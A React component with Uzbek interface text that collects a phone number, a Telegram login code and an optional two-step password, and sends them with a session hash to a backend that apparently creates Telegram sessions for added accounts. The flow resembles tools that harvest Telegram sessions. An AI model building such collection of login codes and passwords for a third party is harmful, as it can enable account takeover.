import { useEffect, useRef, useState } from "react";
import { useOutletContext } from "react-router-dom";
import { sendPhone, sendAuth } from "../Functions/forBackend";

function AddNumber() {
  const { me, setModal, modal } = useOutletContext();

  // STEP (slider uchun)
  const [step, setStep] = useState(0);

  // TELEFON & AUTH
  const [phone, setPhone] = useState("");
  const [auth, setAuth] = useState(null);
  const [auth2, setAuth2] = useState(null);

  // CAPTCHA STATE
  const [capA, setCapA] = useState(0);
  const [capB, setCapB] = useState(0);
  const [capAns, setCapAns] = useState("");
  const [capErr, setCapErr] = useState("");

  // REFS
  const phoneRef = useRef(null);
  const codeRef = useRef(null);
  const twoFaRef = useRef(null);
  const h2Ref = useRef(null);

  // CAPTCHA YARATISH
  function newCaptcha() {
    setCapA(Math.floor(Math.random() * 9) + 1);
    setCapB(Math.floor(Math.random() * 9) + 1);
    setCapAns("");
    setCapErr("");
  }

  // birinchi renderda captcha chiqsin
  useEffect(() => {
    newCaptcha();
  }, []);

  // Sync statusm when auth changes (no state setters in render)
  useEffect(() => {
    if (modal.type == "loader") {
      console.log("true");
      setModal({ type: null, message: "sdfhsdjfksdf" })
    }
    console.log("auth ozgardi");
    console.log(auth);
    if (!auth) return;
    if (auth.data?.auth == 0) {
      if (auth.data?.status != 200) {
        setModal({ type: "note", message: auth.data?.message })

      } else {
        setStep(1);
      }
    }
    if (auth2?.data.auth == 1) {
      if (auth2.data.status != 200) {
        setModal({ type: "note", message: auth2?.data.message })
      } else {
        setStep(2)
        h2Ref.current.innerText = phoneRef.current.value + "\nMuvaffaqiyatli qo‘shildi";
      }
    }
  }, [auth, auth2]);

  // 1-FORM SUBMIT (PHONE + CAPTCHA)
  async function handleSubmit1(e) {
    e.preventDefault();

    // CAPTCHA TEKSHIRISH
    if (Number(capAns) !== capA + capB) {
      setCapErr("❌ Captcha noto‘g‘ri. Qayta urinib ko‘ring.");
      newCaptcha();
      return;
    }

    const phoneValue = phoneRef.current?.value || "";
    setPhone(phoneValue);
    setModal({ type: "loader", message: "sdfhsdjfksdf" })
    try {
      setAuth(await sendPhone(me?.user_id, phoneValue));
    } catch (err) {
      console.error("sendPhone error:", err);
      setCapErr("Server bilan bog'liq xato — qayta urinib ko‘ring.");
    }
  }
  // 2-FORM SUBMIT (CODE + 2FA)
  async function handleSubmit2(e) {
    e.preventDefault();

    const code = codeRef.current?.value;
    const twoFa = twoFaRef.current?.value;
    if (auth?.data?.auth == 0) {
      try {
        setAuth2(await sendAuth(
          me?.user_id,
          phone,
          code,
          auth?.data?.phoneCodeHash,
          auth?.data?.sessionString,
          twoFa
        ));
      } catch (e) {
        console.log("Server bilan xatolik" + e.message);
      }
    } else {
      setTimeout(() => {
        alert("Qaytadan boshlash")
      }, 2500);
    }
  }
  //3 - final new handle
  function newForm() {
    phoneRef.current.value = ""
    codeRef.current.value = ""
    twoFaRef.current.value = ""
    h2Ref.current.value = ""
    setStep(0)
    setAuth(null)
    setAuth2(null)
    setPhone(null)
    newCaptcha();

  }









  return (
    <>
      <div className="flex w-85 overflow-x-hidden mx-auto">
        <div
          className={`flex w-255 transition-transform duration-300 ease-in-out
      ${step === 0 ? "translate-x-0" : ""}
      ${step === 1 ? "-translate-x-85" : ""}
      ${step === 2 ? "-translate-x-170" : ""}
    `}
        >
          {/* ================= FORM 1 ================= */}
          <form onSubmit={handleSubmit1} className="bg-white shadow-md rounded-lg p-4 w-85 space-y-3">
            <h2 className="text-lg font-semibold">Telefon raqam</h2>

            <div>
              <label className="block text-sm font-medium mb-1">Telefon raqam</label>
              <input
                ref={phoneRef}
                title="Telefon raqam faqat shu formatda bo‘lishi kerak: +998XXXXXXXXX"
                pattern="^\+998\d{9}$"
                type="tel"
                required
                placeholder="+998901234567"
                className="w-full border rounded-md px-3 py-2 outline-none"
              />
            </div>

            {/* ===== CAPTCHA ===== */}
            <div>
              <label className="block text-sm font-medium mb-1">Captcha</label>

              <div className="flex items-center gap-2">
                <div className="px-3 py-2 bg-gray-200 rounded font-mono">
                  {capA} + {capB} = ?
                </div>

                <button type="button" onClick={newCaptcha} className="text-blue-600 text-xl" title="Yangi captcha">
                  ↻
                </button>
              </div>

              <input
                type="number"
                value={capAns}
                onChange={(e) => setCapAns(e.target.value)}
                placeholder="Javob"
                className="mt-2 w-full border rounded-md px-3 py-2 outline-none "
                required
              />
              {capErr && <p className="text-red-500 text-sm mt-1">{capErr}</p>}
            </div>

            <button type="submit" className="w-full bg-blue-500 hover:bg-blue-700 text-white font-semibold py-2 rounded-md">
              Kod yuborish
            </button>
          </form>

          {/* ================= FORM 2 ================= */}
          <form onSubmit={handleSubmit2} className="bg-white shadow-md rounded-lg p-4 w-85 space-y-3">
            <h2 className="text-center text-lg font-semibold">Tasdiqlash kodi {phone} raqamga jo'natildi</h2>

            <div>
              <label className="block text-sm font-medium mb-1">Telegram kodi</label>
              <input
                ref={codeRef}
                type="text"
                required
                pattern="^\d{5}$"
                placeholder="12345"
                className="w-full border rounded-md px-3 py-2 outline-none"
              />
            </div>

            <div>
              <label className="block text-sm font-medium mb-1">2 bosqichli parol (agar bo‘lsa)</label>
              <input
                ref={twoFaRef}
                type="password"
                placeholder="Parol"
                className="w-full border rounded-md px-3 py-2 outline-none"
              />
            </div>

            <button
              type="button"
              className="w-full bg-gray-300 hover:bg-gray-400 text-black font-semibold py-2 rounded-md"
              onClick={() => {
                setStep(0);
                newCaptcha();
              }}
            >
              Edit Number
            </button>

            <button type="submit" className="w-full bg-blue-500 hover:bg-blue-700 text-white font-semibold py-2 rounded-md">
              Tasdiqlash
            </button>
          </form>

          {/* ================= FORM 3 ================= */}
          <div className="result bg-white shadow-lg rounded-xl p-6 w-85 space-y-4 flex flex-col items-center text-center animate-fadeIn">
            {/* SUCCESS ICON */}
            <div className="w-16 h-16 flex items-center justify-center rounded-full bg-green-100">
              <svg
                className="w-9 h-9 text-green-600"
                fill="none"
                stroke="currentColor"
                strokeWidth="3"
                viewBox="0 0 24 24"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M5 13l4 4L19 7"
                />
              </svg>
            </div>

            {/* TITLE */}
            <h2 ref={h2Ref} className="text-xl font-semibold text-green-700">
              Success!
            </h2>

            {/* MESSAGE */}
            <p className="text-gray-600">
              Telefon raqam muvaffaqiyatli tasdiqlandi 🎉
            </p>

            {/* OPTIONAL BUTTON */}
            <button
              onClick={newForm}
              className="mt-3 px-5 py-2 bg-green-500 hover:bg-green-600 text-white rounded-lg transition"
            >
              Yana qo‘shish
            </button>
          </div>

        </div>
      </div>
    </>
  );
}

export default AddNumber;
